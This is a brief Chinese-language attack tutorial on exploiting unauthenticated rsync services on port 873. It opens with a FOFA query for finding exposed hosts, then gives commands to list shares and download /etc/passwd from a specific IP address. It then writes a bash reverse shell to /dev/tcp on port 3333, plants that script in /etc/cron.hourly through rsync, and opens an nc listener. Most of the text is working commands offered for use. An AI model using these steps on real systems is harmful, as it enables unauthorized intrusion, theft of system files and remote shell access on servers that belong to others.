rsync是Linux上类似于一个ftp服务，用于备份文件，端口873。fofa：prot="873"

linux一般带有rsync命令
```
rsync rsync://47.94.236.117:873/
```
如果可以无需输入密码直接连接上，就是未授权访问。
```
rsync rsync://47.94.236.117:873/src 
查看linux文件目录

rsync rsync://47.94.236.117:873/src/etc/passwd ./
下载文件到当前目录
```
借助Linux默认计划任务调用/etc/cron.hourly，利用rsync连接覆盖
```
1、创建一个nc文件，内容：
#!/bin/bash
/bin/bash -i >& /dev/tcp/47.94.236.117/3333 0>&1
2、赋予执行权限：
chmod +x nc

3、上传文件覆盖定时任务目录下
rsync -av nc rsync://47.94.236.117:873/src/etc/cron.hourly

4、进行nc 监听相应的端口
nc -lvnp 3333
```